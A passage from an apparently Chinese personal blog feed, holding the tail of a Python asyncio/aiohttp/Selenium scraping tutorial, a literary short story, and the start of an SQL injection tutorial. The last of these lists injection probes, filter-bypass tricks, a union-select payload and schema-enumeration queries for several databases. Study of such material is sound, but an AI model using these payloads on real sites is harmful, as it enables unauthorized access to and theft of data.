print(&#x27;你好3&#x27;)</span><br><span class="line">    # time.sleep(3)</span><br><span class="line">    await asyncio.sleep(3)</span><br><span class="line">    print(&#x27;你好3&#x27;)</span><br><span class="line"></span><br><span class="line">async def func4():</span><br><span class="line">    print(&#x27;你好4&#x27;)</span><br><span class="line">    # time.sleep(3)</span><br><span class="line">    await asyncio.sleep(3)</span><br><span class="line">    print(&#x27;你好4&#x27;)</span><br><span class="line"></span><br><span class="line">async def func5():</span><br><span class="line">    print(&#x27;你好5&#x27;)</span><br><span class="line">    # time.sleep(3)</span><br><span class="line">    await asyncio.sleep(3)</span><br><span class="line">    print(&#x27;你好5&#x27;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;不推荐这种写法，最好有一个协程对象[main函数]&quot;&quot;&quot;</span><br><span class="line"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">#     f1 = func1()</span><br><span class="line">#     f2 = func2()</span><br><span class="line">#     f3 = func3()</span><br><span class="line">#     f4 = func4()</span><br><span class="line">#     f5 = func5()</span><br><span class="line">#     tasks = [f1, f2, f3, f4, f5]</span><br><span class="line">#     t1 = time.time()</span><br><span class="line">#     # 一次性启动多个任务(协程)</span><br><span class="line">#     asyncio.run(asyncio.wait(tasks))</span><br><span class="line">#     t2 = time.time()</span><br><span class="line">#     print(t2-t1)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;推荐写法: &quot;&quot;&quot;</span><br><span class="line">async def main():</span><br><span class="line">    # 第一种写法(不推荐)</span><br><span class="line">    # f1 = fun1()</span><br><span class="line">    # await f1</span><br><span class="line"></span><br><span class="line">    # 第二种写法(推荐)</span><br><span class="line">    tasks = [func1(),</span><br><span class="line">             func2(),</span><br><span class="line">             func3(),</span><br><span class="line">             func4(),</span><br><span class="line">             func5()</span><br><span class="line">    ]</span><br><span class="line">    await asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    #一次性启动多个任务(协程)</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    print(t2-t1)</span><br></pre></td></tr></table></figure><h4 id="异步http请求aiohttp模块"><a href="#异步http请求aiohttp模块" class="headerlink" title="异步http请求aiohttp模块"></a>异步http请求<strong>aiohttp</strong>模块</h4><ul><li>requests.get()是同步的代码 -&gt; 想办法变成异步的 -&gt; 异步操作aiohttp</li></ul><p>这个模块也需要安装 <code>pip install aiohttp</code></p><p>e.g:简单的aiohttp代替requests模块【结合协程】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import aiohttp</span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    &#x27;https://i1.huishahe.com/uploads/tu/201911/9999/6c7b9884f3.png&#x27;,</span><br><span class="line">    &#x27;https://i1.huishahe.com/uploads/tu/201911/9999/93535131da.png&#x27;,</span><br><span class="line">    &#x27;https://i1.huishahe.com/uploads/tu/201908/9999/ffaaacbfad.jpeg&#x27;</span><br><span class="line">]</span><br><span class="line">async def aiodownload(url):</span><br><span class="line">    name = url.rsplit(&#x27;/&#x27;, 1)[1]</span><br><span class="line">    async with aiohttp.ClientSession() as session:</span><br><span class="line">        async with session.get(url) as resp:</span><br><span class="line">            with open(&#x27;真的很美/&#x27;+name, mode=&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(await resp.content.read())  #读取内容是异步的，需要await挂起</span><br><span class="line">async def main():</span><br><span class="line">    tasks = []</span><br><span class="line">    for url in urls:</span><br><span class="line">        tasks.append(aiodownload(url))</span><br><span class="line">    await asyncio.wait(tasks)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure><h5 id="抓取百度小说-dd"><a href="#抓取百度小说-dd" class="headerlink" title="抓取百度小说(dd)"></a>抓取百度小说(dd)</h5><h5 id="抓取视频网站-dd"><a href="#抓取视频网站-dd" class="headerlink" title="抓取视频网站(dd)"></a>抓取视频网站(dd)</h5><p>一般视频网站怎么处理视频？</p><blockquote><p>用户上传 -&gt; 转码(把视频做处理，2k, 1080p, 标清)</p><p>-&gt; 切片处理(把单个文件拆分) -&gt; 用户拉进度条时前面的文件不用加载</p><p>需要一个文件记录：1.视频播放顺序 2.视频存放的路径</p></blockquote><h2 id="selenium"><a href="#selenium" class="headerlink" title="_selenium"></a>_selenium</h2><blockquote><p>有些程序是加密的，我们自己解密拿数据的话会非常痛苦，然而这些程序代码返回给浏览器之后是可以直接渲染成我们想要的东西的。所以衍生一个问题 -&gt; 能不能让我们的程序直接连接到服务器，然后让服务器帮我们解密了我们拿最后的数据？</p><p>selenium本来是自动化测试工具，作用就是打开一个浏览器然后像人一样去操作浏览器，所以程序员可以从selenium中直接提取网页上的各种信息</p></blockquote><ul><li>也需要安装 pip install selenium</li><li>还需要下载浏览器驱动（注意版本最好跟自己的浏览器一样）</li><li>把解压的浏览器驱动放在python解释器所在的文件夹里面</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 让selenium启动火狐浏览器  注意版本一定要对，否则会不兼容报错</span><br><span class="line">from selenium.webdriver import Firefox</span><br><span class="line"># 1.创建浏览器对象</span><br><span class="line">web = Firefox()</span><br><span class="line"># 2.打开一个网址</span><br><span class="line">web.get(&#x27;http://www.baidu.com&#x27;)</span><br><span class="line">print(web.title)</span><br><span class="line">web.close()</span><br></pre></td></tr></table></figure><p>e.g:抓拉钩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from selenium.webdriver import Firefox</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line"></span><br><span class="line">web = Firefox()</span><br><span class="line">web.get(&#x27;http://lagou.com&#x27;)</span><br><span class="line"># 模拟点击事件</span><br><span class="line"># 元素定位  xpath</span><br><span class="line">element = web.find_element(By.XPATH, r&#x27;/html/body/div[10]/div[1]/div[2]/div[2]/div[1]/div/ul/li[1]/a&#x27;)</span><br><span class="line">element.click()     #点击目标元素，模拟用户操作</span><br><span class="line"></span><br><span class="line"># 注意这个点击之后浏览器会刷新，会需要时间，如果后面程序执行时间小于刷新时间极有可能会报错，所以我们最好加上sleep</span><br><span class="line"># time.sleep(1)    要先 import time</span><br><span class="line"></span><br><span class="line"># 模拟搜索事件</span><br><span class="line"># 找到输入框 xpath</span><br><span class="line">search = web.find_element(By.XPATH, r&#x27;//*[@id=&quot;search_input&quot;]&#x27;)</span><br><span class="line"># 输入python  =》点击搜索或者输入回车</span><br><span class="line">search.send_keys(&quot;python&quot;, Keys.ENTER)</span><br><span class="line"></span><br><span class="line"># 利用xpath拿数据。。。  就可以拿到源代码里面没有的东西，直接前端html拿</span><br><span class="line">table =  web.find_element(By.XPATH, r&#x27;//*[@id=&quot;TableList&quot;]/table&#x27;)</span><br><span class="line">print(table.text)</span><br></pre></td></tr></table></figure><p>e.g： 切换窗口</p><p><code>web.switch_to.window(web.window_handles[-1]) # window_handles就是浏览器上面那个窗口</code></p><p>注意还有关闭窗口操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 关闭子窗口</span><br><span class="line">web.close()</span><br><span class="line">#返回到原来的窗口</span><br><span class="line">web.switch_to.window(web.window_handles[0])</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 窗口切换</span><br><span class="line">from selenium.webdriver import Firefox</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">import time</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line"></span><br><span class="line">web = Firefox()</span><br><span class="line"></span><br><span class="line">web.get(&#x27;https://www.lagou.com&#x27;)</span><br><span class="line">web.find_element(By.XPATH, r&#x27;//*[@id=&quot;cboxClose&quot;]&#x27;).click()</span><br><span class="line">time.sleep(1)</span><br><span class="line">web.find_element(By.XPATH, r&#x27;//*[@id=&quot;search_input&quot;]&#x27;).send_keys(&#x27;python&#x27;, Keys.ENTER)</span><br><span class="line">time.sleep(2)</span><br><span class="line">web.find_element(By.XPATH, r&#x27;/html/body/div/div[2]/div/div[3]/div[3]/div/div[1]/div[1]/div[1]/div[1]/div[1]/a&#x27;).click()</span><br><span class="line"># 此时已经进入一个新页面      #变成登录页面了。。。  </span><br><span class="line"># 如何进入到新窗口中进行提取</span><br><span class="line"># 注意，在selenium的眼中，新窗口是不会自动切换的</span><br><span class="line">web.switch_to.window(web.window_handles[-1])   # window_handles就是浏览器上面那个窗口</span><br><span class="line"># 在新窗口中提取内容。。。</span><br><span class="line"></span><br><span class="line"># 关闭子窗口</span><br><span class="line">web.close()</span><br><span class="line">#返回到原来的窗口</span><br><span class="line">web.switch_to.window(web.window_handles[0])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算了吗</title>
      <link href="/2023/05/18/%E7%AE%97%E4%BA%86%E5%90%97/"/>
      <url>/2023/05/18/%E7%AE%97%E4%BA%86%E5%90%97/</url>
      
        <content type="html"><![CDATA[<p>“好恶心”，在吐出第一口烟之后，她将视线从窗外移开。窗子外面是一大片农田，在这个靠近郊区的地方，左边能隐约看到城市里各种颜色的高楼，右边是几个小工厂，散发着发霉的食物的味道。这片农田夹杂在两者之间，让她想起鹤立鸡群这个词，虽然她并不明白这是一个褒义词还是贬义词。</p><p>她盯着田里的一个老太太，挑着担子在一条很简陋的田道上走，衣着和商场超市里买菜的阿姨并没太大区别，唯一不同的脚上那双沾满了泥的布鞋，这在城里是见不到的。老太太缓慢的走向一条水沟，将担子两边的大水桶盛满浑浊的水。她看着这一幕，脑子里浮现的画面却是多年以前她在一所小学附近的小摊子上吃的五元一碗的汤面，卖面的老婆婆和田里这个老太太神情体态如出一辙，都是那种看了就会憎恶都市繁华的类型。</p><p>好恶心，不知道为什么，只有这三个字一直萦绕在耳边，不知道为什么而恶心，只是，她觉得有点，想跳进那个臭水沟里。那条水沟，很小，大概十多平米，整体呈现一个’W’的形状。水面上布满了说不清楚颜色的藓类，周围全是杂草，和些许白色塑料，老太太刚才舀水时制造的涟漪还在扩散，惊扰了附近的野虫，全都停止了聒噪。跳进去的话，全身一定会变得很臭吧？会不会有死鱼在里面？说不定还会有小蝌蚪钻进我的衣服里面，哈哈！</p><p>这是她今天不知道第几次借着上厕所的理由出来抽烟了，被分配到这个偏远部门做技术顾问，她本发誓要大干一场，却发现这里的人们好像并不太需要她。毕竟，她这个年轻的，青涩的技术顾问，实在是很难让人有请教的欲望。领导也对她态度不明，拿着不低的工资却不干什么事情，仗着有总部的撑腰还不能对她做什么。好吧，果然还是偷懒舒服，在学校里逃课逃多了，钻空子这种事情，她比谁都擅长。</p><p>抽完最后一口烟，又得回去了，这让她觉得眼见的景色又迷人了几分，夕阳真的很美，工厂里有工人的小孩在打闹，田里的菜几时会熟…</p><p>可在她的思绪即将飘远的时候，刺耳的电话铃声响起了，使她不得不立即接通，甚至来不及看来电者是谁。</p><p>“悠，告诉你一个好消息！”</p><p>一个熟悉的男声传进耳朵，让她有些错愕，“唔..”</p><p>“我昨晚上陪我爸…陪高总喝酒，他喝多了，我求他把你调回来，还说了你好多好话，说你很有发展前途，他就同意了！你放心，有我担保，你下周一定能回来！”</p><p>强忍着不知从何时升起的反感听完了男人的话，脑子里不知道该想什么，不知道该以什么样的情绪面对这个消息，但她想到了她在玉林路看中的那套房子，就快凑够首付了，再坚持两三年就能靠自己的努力在这个世界上拥有属于自己的，只属于自己的家。“哇，不愧是你，什么都能搞定！”</p><p>“我们…”</p><p>“我们今晚去喝酒吧！”</p><p>对面的男人刚要说话，听见她说喝酒，立马兴奋了起来，连声答应，嘴里不停规划着她调回来后的快乐同事生活。</p><p>挂了电话，胃里泛起一阵恶心，明明已经好久没有跟他有接触了，听到他的声音为什么还是会这么反感。人实在是一个神奇的动物，她曾经一次又一次告诉自己要泛爱万物，告诉自己，“凡所有相者，皆是虚妄”，但讨厌的情绪是摆脱不掉的，就像她无论如何也会觉得楼下的小猫咪可爱。</p><p>那就痛苦吧。</p><p>喝酒的时候，她是另一个人，那个人，没心没肺，嘴里只会念叨着不明所以的东西，会毫无保留的热爱每一片花每一棵树，会忘记，这个世界上有的夜晚会寂寞的让人哭不出声。</p><p>“悠”，她讨厌这个名字，也讨厌正叫着这个名字的人，他坐在对面，小心翼翼的夹着菜，眼里是欲望和丑陋。丑陋，没有理由的丑陋，她和他曾经是好朋友，她会激动的跟他分享她新看的漫画情节有多离谱，会拉着他逃掉工作去游乐园玩上一天，会和他整夜整夜的聊天…可是某一天睡醒了过后，一种讨厌的情绪就在慢慢滋生，恶瘤一旦产生，就会发了疯似的繁殖壮大。全身都被这种病毒所侵蚀，喘不过气来，曾经的浪漫都变成了痛恨。更多时候她强迫自己是一个局外人，麻木的看着这洪水泛滥般的悲剧在上演，好吧，一种很美好的东西正在她的身体里流走，没有任何理由的，一个劲的往外流，但她累了，不想纠结其中的缘由了。</p><p>“今晚别喝多了，你也知道你的酒量，喝多了就到处发疯，你马上就要调回来了，关键时刻可别出什么乱子。”“嗯…..嗯？”她笑了笑，举起酒杯说，“你知道玉林路那边那条老街吗，那附近有很多小酒馆，驻场是我喜欢的风格。你一定要听一听，草东的新歌….”她自顾自的说着，不想听见他的声音，不想看见他的脸，爱情是什么样子的她早就忘记了，她不是受欢迎的类型，在短暂的经历过数不清的暗恋之后便厌倦了，慢慢明白这玩意除了欲望和自我感动之外也没剩下什么。虽然她并不后悔曾经在无数个夜晚发了疯似的渴望它，在日记本上一遍又一遍的描写它的影子，捏造出一首又一首朦胧的小诗，只是现在不会这么干了罢。</p><p>激情也好，厌倦也罢，都是狗shi，还是活着最真实。</p><p>再回过神来的时候，她和他在街道上狂奔！“别过来！我，我要报..警了！”他笑着追，“别闹！我们快回去吧！”她不停的跑，不停的跑，脱下手上的手表丢进垃圾桶！好轻松，真想再喝两口米酒，好甜，喝了那壶酒，眼泪也能是甜的吧，嘻嘻，我才不要尝我的眼泪，不过肯定是甜的！她想跑到心仪的房子外面再看两眼，那可是这个世界上第一个即将属于自己的，只属于自己的家。但是她累了，停在公园里的一个椅子前，椅子上坐着一个失意少年，15,6岁的样子，看见她一身酒气，满脸惊愕的走开了。望着那个年轻的背影，她觉得好帅，周围的路灯是她爱的绿色，少年穿的板鞋是他喜欢的款式，衣服很合身，在周围的草的映衬下，很好看。身后的男人追上来了，“小智智！”她叫着他的小名，丝毫不觉得羞耻，看着他宠溺的眼神打在自己脸上，这一切都好好笑。</p><p>椅子上依偎的一对男女，很安静的听着虫鸣，怀里的女生还在发疯似的胡言乱语，脑子里想的是他那个领导爸爸，明明什么都不用会却可以一边使唤人一边领高薪，她想，也许她也是想过这样的生活的，至少不会拒绝，哈哈…“诶，你看没看过弗洛伊德的书…没看过？哎，我记得，哪一年来着…二三…不对，二二年吧，哪一年真是灰暗啊。对了，‘death drive’，听过吗，死亡驱力，是不是超酷…哈哈哈，死亡驱力…” “悠”他打断她的话，用一种温柔的语气说，</p><p>“你知道，我为什么这么喜欢你吗？”他的手枕在她耳边，“我不希望你这样不要命的喝酒，但是你醉酒的样子，真的好迷人。看见你，我就觉得这个世界的一切道德法律全部被打破，你带我来到了一个原始世界，一个全是快乐的世界”</p><p>一个全是快乐的世界，她怎么只看得到悲伤呢…</p><p>“悠，别再给自己压力了，和我在一起吧，下个月我就在市中心买套房，写我们两个人的名字，我是认真的，我们….”</p><p>“你…你今天的衣服…好，好香！”</p><p>“我知道，这是你喜欢的味道，你给我说过的”，男人温柔的声音逐渐远去，消失在一片迷雾里，火也熄灭了。</p><p>她好像闻到了小时候，奶奶烤玉米的味道，记忆中那个玉米并不好吃，可是烤玉米的时候，木炭和玉米在温度的酿造下，散发出一种无与伦比的香味，这世上绝没有第二种味道能比烤玉米的味道香。烤一个玉米要等好久好久，玉米表面慢慢从金黄变成深焦糖色，太阳会早早落山，水流的声音和火星跳动的声音交织在一起，远处有一颗巨大无比的樱桃树，只有树顶上还有些许红透了的樱桃，拼了命的回忆，也还是想不起来那天那个玉米到底是什么滋味。好想再吃一口烤玉米，她这样想着。然后说</p><p>“那我可以养一只小猫咪吗？”</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2023/05/14/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/14/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在权限验证通过的情况下，将用户的输入数据与sql请求拼接，动态的构造sql语句，并在无任何审查的 情况下直接操作数据库。</p><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><h4 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h4><ol><li>GET</li><li>POST</li><li>Cookie</li><li>http头</li><li>request</li></ol><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><h6 id="1-字符型"><a href="#1-字符型" class="headerlink" title="1.字符型"></a>1.字符型</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 1.经典方法</span><br><span class="line"> id=1   #正常</span><br><span class="line"> id=1&#x27;  #异常或为空</span><br><span class="line"> id=1&#x27; and &#x27;1&#x27;=&#x27;1  #正常</span><br><span class="line"> id=1&#x27; and &#x27;1&#x27;=&#x27;2  #异常或为空</span><br><span class="line"> ​</span><br><span class="line"> 2.网站有基本防护</span><br><span class="line"> 在URL的地址后面加上&#x27;%2B&#x27;  （%2B 是 + 的URL编码。）</span><br><span class="line"> 拼接语句：select * from users where id = &#x27;1&#x27;+&#x27;&#x27; limit 0,1; #正常</span><br></pre></td></tr></table></figure><p>对于第二点：</p><p><a href="https://blog.51cto.com/binghe001/5246926">参考文章</a></p><p>现在有很多防注入程序屏蔽了 and、1&#x3D;1、1&#x3D;2 类似这样的关键字，使用这样的方法有时不能探测到注入点了。</p><p>在url后面进行一些操作注入仍然可以看出注入点</p><p>假设有一个页面，URL是<a href="http://192.168.109.139/news.asp?id=123">http://192.168.109.139/news.asp?id=123</a></p><ul><li>在URL地址后面加上-1，URL变成：<a href="http://192.168.109.139/news.asp?id=123-1">http://192.168.109.139/news.asp?id=123-1</a>，如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞;在 URL地址后面加上 -0，URL变成 <a href="http://192.168.109.139/news.asp?id=123-0">http://192.168.109.139/news.asp?id=123-0</a>，返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞，是数字型的。</li></ul><p>否则：</p><ul><li>在URL的地址后面加上’%2B’，URL地址变为：<a href="http://192.168.109.139/news.asp?id=123">http://192.168.109.139/news.asp?id=123</a>‘%2B’，返回的页面和1同;加上’%2B’asdf，URL地址变为：<a href="http://192.168.109.139/news.asp?id=123">http://192.168.109.139/news.asp?id=123</a>‘%2Basdf，返回的页面和1不同，或者说未发现该条记录，或者错误，则表示存在注入点，是文本型的。</li></ul><p>为什么？</p><p>后端语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select * from news where id=123</span><br></pre></td></tr></table></figure><p>数字型的直接-1,就可以变成<code>where id = 122</code></p><p>如果不是数字型是不会变成122的</p><p>这个时候我们加上<code>&#39;%2B&#39;</code>,%2B 是 + 的URL编码。</p><p>语句变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select * from news where id=&#x27;123&#x27;+&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><code>+</code>是拼接符号，也就是123和空白拼接还是123</p><p>如果加上<code>&#39;%2B&#39;asdf</code></p><p>语句变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select * from news where id=&#x27;123&#x27;+&#x27;asdf&#x27;</span><br></pre></td></tr></table></figure><p>也就是<code>where id=&#39;123asdf&#39;</code> -&gt; 出现错误</p><h6 id="2-数字型"><a href="#2-数字型" class="headerlink" title="2.数字型"></a>2.数字型</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 1、经典方法</span><br><span class="line"> 过滤之后可以尝试下面的</span><br><span class="line">2、使用or 2&gt;1;or 1&gt;2(也就是有些黑名单只有and没有or)</span><br><span class="line"> 3、xor 1=1;xor 1=2(原理同上)</span><br><span class="line"> 4、把and 1=1转换成URL编码(get型)</span><br><span class="line"> 5、使用-1;-0</span><br><span class="line"> 如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞;</span><br><span class="line"> 在 URL地址后面加上 -0，URL变成 news.asp?id=123-0，返回的页面和前面的</span><br><span class="line"> 页面相同，加上-1，返回错误页面，则也表示存在注入漏洞.</span><br></pre></td></tr></table></figure><h6 id="3-搜索型"><a href="#3-搜索型" class="headerlink" title="3.搜索型"></a>3.搜索型</h6><p>搜索型SQL语句是用like加上通配符来实现。</p><p>语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> SELECT*from database.table where users like &#x27;%要查询的关键字%&#x27;</span><br></pre></td></tr></table></figure><p>这里面的%就是匹配任何字符的通配符，常见的通配符还有以下这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> %    -&gt;     代表零个或者多个字符</span><br><span class="line"> _    -&gt;     仅替代一个字符</span><br><span class="line"> [xxx]             -&gt;   字符列中的任何单一字符       </span><br><span class="line"> [!xxx]或者[^xxx]   -&gt;   不在字符列中的任何单一字符</span><br></pre></td></tr></table></figure><p>现在想办法构造一下payload：</p><p>我们在搜索框输入<code>李%‘and’1’=‘1’ and&#39;%’=’</code></p><p>sql语句变成<code>SELECT*from database.table where users like &#39;%李%&#39;and&#39;1&#39;=&#39;1&#39; and&#39;%&#39;=&#39;%&#39;</code> 这个语句就很正常不会报错</p><blockquote><p>简单的判断搜索型注入漏洞存在不存在的办法是先搜索’，如果出错，说明90%存在这个漏洞。然后搜 索%，如果正常返回，说明95%有洞了。</p></blockquote><p>为什么呢？</p><p>输入<code>&#39;</code> 则SQL语句变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> SELECT*from database.table where users like &#x27;%&#x27;%&#x27;           #这个语句是错误的，会报错</span><br></pre></td></tr></table></figure><p>输入<code>%</code> 则SQL语句变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> SELECT*from database.table where users like &#x27;%%%&#x27;           #这个语句是正确的，即搜索全部的内容</span><br></pre></td></tr></table></figure><p>进一步探测，输入如下两条语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 操作： 关键字%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;% #正常 关键字%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;% #异常</span><br></pre></td></tr></table></figure><p>开始爆东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> %&#x27; union select 1,2,(select database()),4,5 and &#x27;%&#x27;=&#x27; 组装一下就是: SELECT*from database.table where users like &#x27;%%&#x27; union select 1,2,(select database()),4,5 and &#x27;%&#x27;=&#x27;%&#x27; </span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><hr><h5 id="关于注释符"><a href="#关于注释符" class="headerlink" title="关于注释符"></a>关于注释符</h5><blockquote><p>采用 “–”(双减号)进行单行注释，注意：”–”与注释内容要用空格隔开才会生效</p></blockquote><ul><li>MySQL<ul><li><code>#</code> :post，输入框 直接写，url的get用<code>%23</code></li><li><code>--+</code>:url的get直接写，如果在输入框中会报错(（输入栏中输入 –空格 也行),因为在URL中+会被当做空格，也就是%20，而输入框中就是+。</li><li>另外，<code>注释解释/*!50001 sql*/</code>表示数据库5.00.01版本以上的执行该sql语句</li></ul></li><li>PostgreSQL,SQL server,Oracle<ul><li>--+ 规则同上</li></ul></li></ul><h5 id="查询语句构造"><a href="#查询语句构造" class="headerlink" title="查询语句构造"></a>查询语句构造</h5><ul><li>mysql select database(); #查看当前数据库<br> select user();<br> select group_concat(table_name) from information_schema.tables where<br> table_schema&#x3D;’security’–+ #看security数据库中的表名<br> select group_concat(column_name) from information_schema.columns where<br> table_name&#x3D;’users’ –+ #查看users表中的列名</li><li>SQL Server union select 1,null,’1’ –null代表空，在不知道数据类型时可以用null代替<br> select db_name(); –查看当前数据库名<br> select SYSTEM_USER;<br> select top 1 null,null,name from sysdatabases where name not in (select top<br> 1 name from sysdatabases) –查看系统数据库名<br> –或者<br> select null,null,name from sys.databases for xml path –利用XML获取所有结果<br> select top 1 name from test.sys.tables where name not in (select top 2 name<br> from test.sys.tables)<br> –或者<br> select top 1 TABLE_NAME from INFORMATION_SCHEMA.TABLES where<br> TABLE_NAME!&#x3D;’sysdiagrams’; –一个一个看数据库中的表名，详见报错注入<br> –或者<br> select null,null,name from test.sys.tables for xml path –利用XML获取所有结果<br> select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where<br> TABLE_NAME&#x3D;’table_test’; –看表中列名<br> select top 1 name from table_test where name not in (select top 1 name from<br> table_test); –获得数据值</li><li>PostgreSQL select current_database(); –当前数据库名<br> select datname from pg_database limit 1 offset 0; –获取系统数据库名<br> select * from current_user;或者 select user;<br> select CURRENT_SCHEMA() –查看当前权限<br> select tablename from pg_tables limit 1 offset 0; –获取数据库表名<br> select column_name from information_schema.columns where table_name &#x3D;<br> ‘test’;–获取字段名</li><li>Oracle select name from V$DATABASE;<br> select user from dual; –查当前用户<br> select table_name,tablespace_name from user_tables; –表名和表空间<br> select column_name from user_tab_columns where table_name&#x3D;’DOG’; –表的列名<br> –oracle弱化了库的概念，它以用户名作为区分，用户名&#x3D;库名。<br> select * from all_tables –查询所有的表<br> select * from user_tables –查询出当前用户的表<br> select * from all_tab_columns –查询出所有的字段<br> select * from user_tab_columns –查询出当前用户的字段</li></ul><h3 id="MYSQL注入分类"><a href="#MYSQL注入分类" class="headerlink" title="MYSQL注入分类"></a>MYSQL注入分类</h3><h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h5><p>联合查询：将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并</p><ul><li>关键字：union、 union all</li><li>需要与原查询结果拥有相同数量且结果兼容的列</li><li>检测<ul><li>order by 列数</li><li>union select 1,2，…#</li><li>union all select 1,2，…#</li></ul></li><li>注意：原查询语句可能包含Limit等限制查询结果，所以使用union或union all查询的时候，最好屏 